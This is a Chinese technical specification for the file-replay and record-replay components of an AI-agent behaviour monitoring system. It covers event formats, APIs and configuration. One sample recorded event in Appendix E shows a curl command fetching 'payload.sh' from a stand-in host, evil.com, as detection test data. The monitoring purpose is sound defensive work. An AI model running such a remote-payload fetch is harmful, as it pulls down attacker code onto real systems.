# 外部测试信息接入接口说明

> **版本**：1.2
> **日期**：2026-07-31
> **适用范围**：方寸观察者模拟学习系统（observer_sim）统一架构
> **实现模块**：`collector/file_replay_collector.py` + `collector/event_recorder.py`

---

## 1. 概述

本系统通过 `FileReplayCollector` 实现外部测试数据的接入。该采集器实现 `ICollector` 统一接口，从外部 JSONL/CSV 文件导入测试数据，逐行解析并 yield `RawEvent` 给上层 `observer_core/` 处理链路。

**核心设计原则**：

| 原则 | 说明 |
|------|------|
| **核心零改动** | `observer_core/`、`models/`、`scenarios/`、`rules/` 目录不做任何修改 |
| **白盒化** | JSONL 每行是一个完整事件，可逐行审计、文本编辑器可编辑、Git diff 友好 |
| **贴近生产** | 支持导入真实 eBPF/strace/Falco 采集的数据，离线回放分析 |
| **架构一致** | 实现 `ICollector` 接口，与 SimulationCollector/EbpfCollector/StraceCollector 并列 |

**数据流架构**：

```
外部数据源                          FileReplayCollector           observer_core/
──────────                          ───────────────────           ──────────────
eBPF 采集导出    → JSONL 文件  →                                  → RawEvent 流
strace 输出      → 转换脚本  → JSONL 文件  →  load_data_file()  →
Falco 告警日志   → 转换脚本  → JSONL 文件  →  attach()          →  EventNormalizer
第三方工具输出   → JSONL/CSV 文件        →  start()            →  → DecisionEngine
手工白盒数据     → 直接编写  → JSONL/CSV  →  yield RawEvent     →  → AuditLogger
```

## 2. 数据来源类型

### 2.1 支持的数据源

| 数据源 | 说明 | 接入方式 |
|--------|------|----------|
| **生产 eBPF 采集数据** | EbpfCollector 实时采集后导出的 JSONL | 直接加载或经 `export_ebpf_to_jsonl.py` 导出 |
| **strace 输出日志** | strace `-e trace=execve,openat,connect` 输出 | 经格式转换脚本转为 JSONL |
| **Falco/Sysdig 告警** | Falco JSON 告警日志 | 经字段映射转换脚本转为 JSONL |
| **第三方安全工具** | 任何输出 JSON/CSV 的安全监控工具 | 经格式转换脚本转为 JSONL/CSV |
| **手工白盒测试数据** | 开发者手工编写的测试场景 | 直接编写 JSONL/CSV 文件 |

### 2.2 数据转换管道

```
┌─────────────────┐     ┌──────────────────┐     ┌────────────────────┐
│  原始数据源      │     │  格式转换脚本     │     │  FileReplayCollector│
│                 │     │  (可选)           │     │                    │
│  eBPF JSONL     │────→│                  │────→│  load_data_file()  │
│  strace 文本    │────→│  strace_to_jsonl  │────→│  attach()          │
│  Falco JSON     │────→│  falco_to_jsonl   │────→│  start()           │
│  自定义 CSV     │─────────────────────────────→│  yield RawEvent     │
└─────────────────┘     └──────────────────┘     └────────────────────┘
```

## 3. 数据格式规范

### 3.1 JSONL 格式（首选）

**文件扩展名**：`.jsonl` 或 `.json`

**文件结构**：
- 每行一个完整的 JSON 对象，对应一个 `RawEvent`
- 支持 `#` 开头的注释行（用于标注测试意图，白盒特性）
- 空行自动跳过
- 文件编码：UTF-8

**字段定义**：

| 字段名 | 类型 | 必填 | 说明 | 有效值 |
|--------|------|:---:|------|--------|
| `event_type` | string | **是** | 事件类型 | `"exec"` / `"file_open"` / `"net_conn"` |
| `pid` | int | 否 | 进程 ID（默认 0） | 正整数 |
| `ppid` | int | 否 | 父进程 ID（默认 0） | 正整数 |
| `timestamp_ns` | int | 否 | 纳秒时间戳（默认 0） | 正整数 |
| `agent_id` | string | 否 | Agent 标识（默认取配置值） | 任意字符串 |
| `agent_framework` | string | 否 | 数据来源标识（默认 `"file_replay"`） | 任意字符串 |
| `executable` | string | 否 | 可执行文件路径（exec 事件） | 绝对路径 |
| `arguments` | string[] | 否 | 命令行参数列表（exec 事件） | 字符串数组 |
| `file_path` | string | 否 | 文件路径（file_open 事件） | 绝对路径 |
| `file_op` | string | 否 | 文件操作类型（file_open 事件） | `"read"` / `"write"` / `"delete"` / `"rename"` / `"chmod"` |
| `remote_addr` | string | 否 | 远程地址（net_conn 事件） | IP 地址或域名 |
| `remote_port` | int | 否 | 远程端口（net_conn 事件） | 1-65535 |
| `protocol` | string | 否 | 传输协议（net_conn 事件） | `"TCP"` / `"UDP"` |
| `event_id` | string | 否 | 事件唯一 ID（自动生成） | 任意字符串 |

**各事件类型的推荐字段组合**：

| event_type | 推荐必填字段 | 说明 |
|------------|-------------|------|
| `exec` | `event_type`, `pid`, `executable`, `arguments` | 进程执行事件 |
| `file_open` | `event_type`, `pid`, `file_path`, `file_op` | 文件操作事件 |
| `net_conn` | `event_type`, `pid`, `remote_addr`, `remote_port`, `protocol` | 网络连接事件 |

### 3.2 CSV 格式

**文件扩展名**：`.csv`

**文件结构**：
- 第一行为表头，必须包含 `event_type` 列
- 后续每行一个事件
- 空字段留空即可（自动填充默认值）
- `arguments` 列支持 JSON 数组格式（`["arg1","arg2"]`）或逗号分隔格式（`arg1,arg2`）
- 文件编码：UTF-8

**列名定义**：与 JSONL 字段名完全一致（见上表）。

### 3.3 数据校验规则

| 规则 | 说明 | 处理方式 |
|------|------|----------|
| `event_type` 必填 | 缺少或为空的事件行被跳过 | 记录 WARNING 日志 |
| `event_type` 值域 | 必须为 `exec` / `file_open` / `net_conn` | 未知值跳过，记录 WARNING |
| JSON 格式错误 | JSONL 行解析失败 | 跳过该行，记录 WARNING |
| 整数类型字段 | `pid`/`ppid`/`timestamp_ns`/`remote_port` 非数字 | 填充默认值 0/None |
| 文件不存在 | `load_data_file(path)` 路径无效 | 抛出 `FileNotFoundError` |
| 不支持的格式 | 非 `.jsonl`/`.csv` 且无法作为 JSONL 解析 | 抛出 `ValueError` |

## 4. 接入方式

### 4.1 编程接口（Python API）

```python
from collector.file_replay_collector import FileReplayCollector
import yaml

# 加载配置
with open("config.yaml", "r") as f:
    config = yaml.safe_load(f)

# 创建采集器
collector = FileReplayCollector(config)

# 加载数据文件（自动检测 JSONL/CSV）
count = collector.load_data_file("test_data/whitebox/malicious_curl.jsonl")
print(f"加载了 {count} 个事件")

# 附着
collector.attach(agent_id="test-agent")

# 逐条获取事件
for event in collector.start():
    print(f"[{event.event_type}] pid={event.pid} exe={event.executable}")

# 断开
collector.detach()
```

### 4.2 工厂函数接入（推荐）

通过 `detect_and_create_collector()` 工厂函数，使用 `file_replay` 模式：

```python
from adapter.platform_detect import detect_and_create_collector

config = {"mode": "file_replay", "file_replay": {"data_file": "path/to/data.jsonl"}}
collector = detect_and_create_collector(config, mode_override="file_replay")
```

### 4.3 CLI 命令行接入

> **注意**：当前 `main.py` 的 `--mode` 参数 choices 为 `["auto", "simulation", "strace", "ebpf"]`，**尚未包含 `file_replay`**。若需通过 CLI 使用 file_replay 模式，需先修改 `main.py` 的 argparse choices，或直接修改 `config.yaml` 中的 `mode` 字段。

```bash
# 方式一：通过 config.yaml 配置（推荐）
# 修改 config.yaml 中 mode: "file_replay"
# 修改 file_replay.data_file: "path/to/data.jsonl"
python3 main.py

# 方式二：待 main.py 更新后可直接使用
# python3 main.py --mode file_replay --scenario n01
```

> **三入口集成状态**：`main.py`、`demo.py`、`app.py` 当前均未内置 FileReplayCollector 的专用调度逻辑。通过工厂函数 `detect_and_create_collector()` 可正确创建 FileReplayCollector 实例，但场景加载、事件驱动等流程仍走 SimulationCollector 路径。完整集成需更新三入口的路由逻辑。

### 4.4 与 observer_core/ 处理链路对接

`FileReplayCollector` yield 的 `RawEvent` 与 `SimulationCollector`/`EbpfCollector`/`StraceCollector` 产出的事件格式完全一致，`observer_core/` 处理链路无需任何修改：

```
FileReplayCollector.start()
    ↓ yield RawEvent
observer_core/monitoring/event_normalizer.py
    ↓ RawEvent → NormalizedEvent
observer_core/judgment/risk_scorer.py
    ↓ 四维风险评分
observer_core/judgment/decision_engine.py
    ↓ 三级梯度判定
observer_core/blocking/blocking_coordinator.py
    ↓ 阻断决策（回放模式下不阻断）
observer_core/audit/audit_logger.py
    ↓ 审计日志输出
```

## 5. 配置说明

### 5.1 config.yaml 配置段

```yaml
# 运行模式
mode: "file_replay"
# 可选值: "auto" | "simulation" | "strace" | "ebpf" | "file_replay"
# 注意: main.py --mode CLI 参数当前仅支持 ["auto", "simulation", "strace", "ebpf"]
#       file_replay 模式需通过修改 config.yaml 或编程接口使用

# 文件回放采集模式配置
file_replay:
  data_file: "test_data/whitebox/malicious_curl.jsonl"   # 默认回放文件
  loop: false                      # 是否循环回放（当前未实现）
  time_scale: 1.0                  # 时间缩放因子（当前未实现）
  target_agent_id: "replay-agent"  # 默认 agent 标识
```

> **实现状态说明**：`loop` 和 `time_scale` 配置项已在 config.yaml 中定义，但 `FileReplayCollector.start()` 当前为一次性遍历，尚未实现循环回放和时间缩放逻辑。如需使用，请直接调用 `load_data_file()` + `start()` 编程接口自行控制。

### 5.2 配置项说明

| 配置项 | 类型 | 默认值 | 说明 |
|--------|------|--------|------|
| `file_replay.data_file` | string | — | 数据文件路径（相对于项目根目录或绝对路径） |
| `file_replay.loop` | bool | `false` | 是否循环回放（到达文件末尾后重新开始） |
| `file_replay.time_scale` | float | `1.0` | 时间缩放因子（1.0 = 原始速度，2.0 = 两倍速） |
| `file_replay.target_agent_id` | string | `"replay-agent"` | 未指定 agent_id 时使用的默认值 |

## 9. 扩展指南

### 9.1 添加新的数据源转换脚本

转换脚本的职责：将原始数据格式转为 JSONL，每行符合 `RawEvent` 字段定义。

**模板**：

```python
#!/usr/bin/env python3
"""
tools/<source>_to_jsonl.py — 将 <数据源> 输出转换为 JSONL 格式

用法:
    python3 tools/<source>_to_jsonl.py --input <原始文件> --output <输出.jsonl>
"""

import json
import sys

def convert(input_path: str, output_path: str):
    with open(input_path, "r") as fin, open(output_path, "w") as fout:
        for line in fin:
            # 解析原始格式
            raw = parse_line(line)
            if raw is None:
                continue

            # 映射为 RawEvent 字段
            event = {
                "event_type": map_event_type(raw),
                "pid": raw.get("pid", 0),
                "ppid": raw.get("ppid", 0),
                "timestamp_ns": raw.get("timestamp_ns", 0),
                "agent_id": raw.get("agent_id", "imported"),
                "agent_framework": "file_replay",
                # 按 event_type 填充对应字段
            }
            fout.write(json.dumps(event, ensure_ascii=False) + "\n")

if __name__ == "__main__":
    convert(sys.argv[1], sys.argv[2])
```

### 9.2 支持新的文件格式

如需支持新格式（如 JSON Array、Parquet 等），在 `FileReplayCollector` 中新增 `_load_<format>()` 方法，并在 `load_data_file()` 中添加格式检测分支。

## 10. 已知限制

| 限制 | 说明 | 缓解方案 |
|------|------|----------|
| 不支持动态阻断 | `send_command()` 始终返回 `False` | 使用 SimulationCollector 进行阻断测试 |
| 不维护进程树 | `get_process_tree()` 返回空字典 | 回放模式下 EventNormalizer 自行维护进程树 |
| 时间戳为静态值 | 使用文件中的固定时间戳 | 适合离线分析，不适合实时监测 |
| 单次回放 | 默认不循环 | `loop` 和 `time_scale` 配置项已定义但代码未实现 |
| 三入口未集成 | main.py/demo.py/app.py 无 file_replay 专用路由 | 需通过编程接口或工厂函数使用 |

## 附录 D. 真实 AGENT 接入分析报告

> 本节系统性分析系统对真实 AGENT 输入的接受能力、接入路径、能力边界和限制。

### D.1 系统处理链路概览

```
外部 AGENT
    ↓ 输出事件数据
采集层 (ICollector)
    ↓ yield RawEvent
EventNormalizer
    ↓ RawEvent → NormalizedEvent（进程树维护 + Agent 会话追踪 + 命令拼接）
RuleEngine
    ↓ 规则匹配（规则库: rules/default_policy.yaml）
RiskScorer
    ↓ 四维风险评分（规则匹配 0.40 + 基线偏离 0.25 + 上下文风险 0.20 + 序列异常 0.15）
DecisionEngine
    ↓ 三级梯度判定（Tier1 警告 → Tier2 阻断 → Tier3 终止）
BlockingCoordinator
    ↓ 阻断决策执行
AuditLogger
    ↓ 审计日志 + 行为图谱 + 链式报告
```

### D.2 系统可接受的 AGENT 输入类型

#### D.2.1 事件类型

| 事件类型 | 说明 | 上游探针 | 规则引擎支持 |
|----------|------|----------|----------------|
| `exec` | 进程执行事件（execve/fork/clone） | ProcessProbe | 命令字符串匹配、可执行文件黑名单 |
| `file_open` | 文件操作事件（openat/unlink/rename） | FileProbe | 文件路径匹配、敏感文件检测 |
| `net_conn` | 网络连接事件（connect/sendto/DNS） | NetworkProbe | 远程地址/端口匹配、协议分析 |

**关键约束**：系统当前仅接受以上三种事件类型，其他类型（如 `registry`、`dns_query`、`module_load`）会被 `_validate_event()` 拒绝。

#### D.2.2 数据格式

| 格式 | 支持状态 | 说明 |
|------|----------|------|
| JSONL | ✅ 已实现 | 每行一个 JSON 对象，支持 `#` 注释行 |
| CSV | ✅ 已实现 | 表头必须含 `event_type` 列 |
| JSON Array | ✖ 未实现 | 需扩展 `_load_json_array()` |
| Parquet | ✖ 未实现 | 需扩展 `_load_parquet()` |
| 实时流（HTTP/WebSocket） | ✖ 未实现 | 需新增 StreamCollector |

#### D.2.3 来源渠道

| 渠道 | 状态 | 说明 |
|------|------|------|
| 静态文件（JSONL/CSV） | ✅ 已实现 | FileReplayCollector 直接加载 |
| C++ 探针管道（Named Pipe/FIFO） | ✅ 已实现 | SimulationCollector（Windows）/ EbpfCollector（Linux） |
| strace 子进程 | ✅ 已实现 | StraceCollector（Linux） |
| HTTP API 实时推送 | ✖ 未实现 | 需新增 RESTCollector 或 Flask 端点 |
| WebSocket 实时流 | ✖ 未实现 | 需新增 StreamCollector |
| Kafka/MQTT 消息队列 | ✖ 未实现 | 需新增 MQCollector |

### D.3 各类采集器能力边界与适用场景

| 采集器 | 平台 | 阻断能力 | 时间源 | 性能开销 | 适用场景 | AGENT 接入适用性 |
|--------|------|---------|--------|---------|---------|----------------|
| SimulationCollector | 双端 | Tier2+Tier3 | VirtualClock | low | 教学演示、场景测试 | 不适用（场景驱动，非事件驱动） |
| EbpfCollector | Linux | 无（第一版） | kernel monotonic | very_low | 生产环境真实采集 | 可导出为 JSONL 供 FileReplay 回放 |
| StraceCollector | Linux | 无 | realtime_monotonic | medium | eBPF 不可用时降级 | 可导出为 JSONL 供 FileReplay 回放 |
| FileReplayCollector | 双端 | 无 | file_timestamp | low | 白盒测试、外部数据接入 | **主要接入通道** |

### D.4 真实 AGENT 接入数据转换路径

#### 路径 A：离线回放（当前可用）

```
真实 AGENT 运行
    ↓ 采集事件（eBPF/strace/自定义探针）
原始数据文件
    ↓ 格式转换脚本（strace_to_jsonl / falco_to_jsonl / 自定义）
JSONL 文件（每行符合 RawEvent 字段定义）
    ↓ FileReplayCollector.load_data_file()
FileReplayCollector.start() → yield RawEvent
    ↓
observer_core/ 处理链路
```

**适用场景**：事后分析、白盒测试、教学演示
**限制**：非实时，无法动态阻断

#### 路径 B：实时采集（Linux 环境）

```
真实 AGENT 运行
    ↓ eBPF/strace 直接观测
EbpfCollector / StraceCollector
    ↓ yield RawEvent（实时）
observer_core/ 处理链路
```

**适用场景**：生产环境实时监测
**限制**：仅 Linux，第一版无阻断能力

#### 路径 C：实时 API 接入（待实现）

```
真实 AGENT 运行
    ↓ HTTP POST / WebSocket 推送事件
[RESTCollector / StreamCollector] ← 待实现
    ↓ yield RawEvent
observer_core/ 处理链路
```

**适用场景**：跨平台实时监测、远程 Agent 监控
**实现建议**：在 Flask app.py 中新增 `/api/v1/events` 端点，接收外部事件并注入处理链路

### D.5 当前架构对真实 AGENT 接入的支持度评估

| 维度 | 支持度 | 说明 |
|------|--------|------|
| 数据格式兼容性 | ✅ 高 | JSONL/CSV 格式灵活，字段自动补充默认值 |
| 事件类型覆盖 | ✅ 完整 | exec/file_open/net_conn 覆盖主要安全监测场景 |
| observer_core 零改动 | ✅ 完全 | RawEvent 格式统一，上游无感知 |
| 实时接入能力 | ✅ 已支持 | EventRecorder 实现“录制-回放”工作流，AGENT 事件可实时录制为 JSONL 后回放分析 |
| 动态阻断能力 | ⚠️ 有限 | FileReplay 不支持，Simulation 支持，eBPF 第一版不支持 |
| 多 Agent 支持 | ✅ 完整 | EventNormalizer 按 agent_id 维护独立上下文 |
| 跨平台支持 | ✅ 完整 | FileReplayCollector 双端可用 |
| 进程树维护 | ✅ 完整 | EventNormalizer 自动从 pid/ppid 构建 |

### D.6 接入建议与优先级

| 优先级 | 建议 | 工作量 | 说明 |
|--------|------|--------|------|

### D.7 AGENT 接入快速开始示例

```python
#!/usr/bin/env python3
"""
快速开始：将真实 AGENT 事件接入 observer_core 处理链路
"""
import sys, os, json, yaml
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from collector.file_replay_collector import FileReplayCollector
from observer_core.monitoring.event_normalizer import EventNormalizer
from observer_core.judgment.risk_scorer import RiskScorer
from observer_core.judgment.decision_engine import DecisionEngine
from observer_core.audit.audit_logger import AuditLogger
from models.virtual_clock import VirtualClock

# 1. 加载配置
with open("config.yaml", "r", encoding="utf-8") as f:
    config = yaml.safe_load(f)

# 2. 创建 FileReplayCollector 并加载 AGENT 事件文件
collector = FileReplayCollector(config)
collector.load_data_file("agent_events.jsonl")  # AGENT 输出的 JSONL 文件
collector.attach(agent_id="real-agent")

# 3. 初始化 observer_core 处理链路
clock = VirtualClock()
normalizer = EventNormalizer(clock, window_size=10)
scorer = RiskScorer(config)
engine = DecisionEngine(config)
logger = AuditLogger(config)

# 4. 逐事件处理
for raw_event in collector.start():
    normalized = normalizer.normalize(raw_event)
    score = scorer.score(normalized)
    decision = engine.decide(normalized, score)
    logger.log(normalized, score, decision)
    print(f"[{normalized.event_type}] risk={score.total:.2f} decision={decision.action}")

collector.detach()
```

**AGENT 输出 JSONL 格式要求**：

```jsonl
{"event_type": "exec", "pid": 12345, "ppid": 12340, "executable": "/usr/bin/curl", "arguments": ["curl", "https://example.com"], "timestamp_ns": 1718092800000000000, "agent_id": "my-agent"}
{"event_type": "net_conn", "pid": 12345, "remote_addr": "93.184.216.34", "remote_port": 443, "protocol": "TCP", "timestamp_ns": 1718092800100000000, "agent_id": "my-agent"}
{"event_type": "file_open", "pid": 12345, "file_path": "/tmp/downloaded_file", "file_op": "write", "timestamp_ns": 1718092800200000000, "agent_id": "my-agent"}
```

最小必填字段仅为 `event_type`，其余字段均有默认值。`agent_id` 建议填写以便多 Agent 场景下的上下文追踪。

## 附录 E. 录制-回放工作流（Record-and-Replay）

> v1.2 新增：通过 `EventRecorder` 实现 AGENT 事件的实时录制与回放分析。

### E.1 工作流程

```
Phase 1: RECORD（录制）
────────────────────────
外部 AGENT 运行
    ↓ 产生事件（eBPF/strace/自定义探针/模拟数据）
EventRecorder
    ↓ 实时写入 JSONL 文件（每条 flush）
录制文件: output/recorded/session.jsonl

Phase 2: REPLAY（回放）
────────────────────────
录制文件
    ↓ FileReplayCollector.load_data_file()
FileReplayCollector.start() → yield RawEvent

Phase 3: ANALYZE（分析）
────────────────────────
RawEvent 流
    ↓ EventNormalizer → RuleEngine → RiskScorer → DecisionEngine
    ↓ BlockingCoordinator → AuditLogger + BehaviorGraph
输出: 风险分析报告 + 行为图谱 + 审计日志 + 模拟阻断结果
```

### E.2 EventRecorder API

`collector/event_recorder.py` 提供三种使用方式：

**方式一：包裹迭代器（推荐）**

```python
from collector.event_recorder import EventRecorder

recorder = EventRecorder("output/recorded/session.jsonl", agent_id="my-agent")
recorder.start()

# 透明录制：逐条写入后原样 yield，不修改不过滤
for raw_event in recorder.record(any_collector.start()):
    process(raw_event)
# 迭代器耗尽时自动 stop()
```

**方式二：手动逐条写入**

```python
recorder = EventRecorder("output/recorded/session.jsonl")
recorder.start()
recorder.write(raw_event_1)
recorder.write(raw_event_2)
count = recorder.stop()  # 返回录制总数
```

**方式三：上下文管理器**

```python
with EventRecorder("output/recorded/session.jsonl") as recorder:
    for raw_event in recorder.record(source):
        process(raw_event)
```

### E.4 录制文件格式

EventRecorder 输出的 JSONL 文件与 FileReplayCollector 完全兼容：

```jsonl
# Recorded by EventRecorder at 2026-07-31T14:55:12
# agent_id: target-agent
{"event_id": "rec_001", "timestamp_ns": 1718092800000000000, "event_type": "exec", "pid": 50001, "ppid": 50000, "agent_id": "target-agent", "agent_framework": "recorded", "executable": "/usr/bin/curl", "arguments": ["curl", "-s", "https://evil.com/payload.sh"], ...}
{"event_id": "rec_002", "timestamp_ns": 1718092800100000000, "event_type": "net_conn", ...}
```

- 头部 `#` 注释行记录录制元信息（自动跳过）
- 每行一个完整 JSON 对象，符合 RawEvent 字段规范
- 每条写入后立即 flush，确保进程中断不丢数据

```python
# 录制文件已就绪，可随时回放
```
